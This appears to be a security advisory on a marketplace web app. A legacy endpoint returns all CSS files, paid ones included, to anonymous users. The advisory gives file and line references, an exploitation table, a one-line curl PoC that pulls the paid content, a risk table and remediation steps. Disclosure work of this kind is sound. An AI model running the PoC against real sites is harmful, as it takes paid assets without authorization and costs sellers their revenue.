# Description

Missing authorization on the legacy CSS endpoint (CWE-862). The primary download endpoint `POST /api/css/<uuid>/download/` (`Api/views.py:827-830`) correctly verifies purchase ownership. However, the legacy endpoint `GET /api/css/legacy/` (`Api/views.py:911-924`) returns **all** CSS files — including paid ones — with **no authentication** and no purchase check. Any anonymous user retrieves every paid CSS source for free.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | No authentication needed. | The legacy endpoint is fully unauthenticated. |
| 2 | `GET /api/css/legacy/` | All CSS files (including paid) returned in one response. |
| 3 | Extract paid CSS content from the response. | Full source obtained for free. |

# PoC

```bash
# No authentication, no session cookie needed
curl -s "http://<TARGET>/api/css/legacy/" | python3 -c "
import json,sys; d=json.load(sys.stdin)
for item in d.get('data',d.get('css_files',[])):
  print(item.get('name','?'), '-', str(item.get('css_content',''))[:80]+'...')
"
# Returns all CSS files including paid ones, fully unauthenticated
```

The legacy endpoint at `Api/views.py:911-924` returns all CSS content without any purchase or authentication check, while the primary `/api/css/<uuid>/download/` endpoint correctly enforces ownership.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Paid CSS source (IP) disclosed to non-buyers. |
| Integrity | Marketplace payment model bypassed; sellers uncompensated. |
| Availability | None directly. |

Overall severity: **High** — direct revenue loss and asset theft for every paid product.

# Remediation

1. **Remove the legacy endpoint** (`/api/css/legacy/`) from production, or add authentication and purchase verification.
2. **Audit all asset-serving routes** for missing ownership checks.
3. Apply the same purchase-verification pattern used in `/api/css/<uuid>/download/` to any remaining unprotected routes.

# Author
CPE LYON
